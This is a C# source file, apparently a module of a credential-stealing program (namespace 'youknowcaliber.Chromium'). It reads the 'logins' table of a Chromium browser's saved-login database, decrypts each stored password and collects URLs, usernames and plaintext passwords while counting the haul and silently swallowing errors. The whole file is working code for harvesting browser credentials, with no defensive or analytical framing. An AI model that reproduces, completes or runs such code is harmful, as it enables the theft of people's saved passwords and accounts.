using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
    internal sealed class Passwords
    {
      
        public static List<Password> Get(string sLoginData)
        {
            List<Password> pPasswords = new List<Password>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
                if (sSQLite == null) return pPasswords;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Password pPassword = new Password();

                    pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    string sPassword = sSQLite.GetValue(i, 5);

                    if (sPassword != null)
                    {
                        pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
                        pPasswords.Add(pPassword);

                        Counting.Passwords++;
                    }
                    continue;

                }

            }
            catch { }
            return pPasswords;
        }
    }
}
